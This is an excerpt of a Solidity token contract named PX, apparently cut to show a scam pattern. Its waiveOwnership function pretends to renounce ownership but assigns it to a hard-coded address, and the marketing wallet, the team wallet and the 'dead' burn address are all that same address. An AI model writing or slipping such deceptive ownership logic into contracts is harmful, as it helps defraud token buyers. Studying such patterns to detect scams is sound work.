...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x05075440EE5a6BcB346C0615503d1055f2457628));
        _owner = address(0x05075440EE5a6BcB346C0615503d1055f2457628);
    }
...
contract PX is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PX";
    string private _symbol = "TT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x05075440EE5a6BcB346C0615503d1055f2457628);
    address payable public teamWalletAddress = payable(0x05075440EE5a6BcB346C0615503d1055f2457628);
    address public immutable deadAddress = 0x05075440EE5a6BcB346C0615503d1055f2457628;
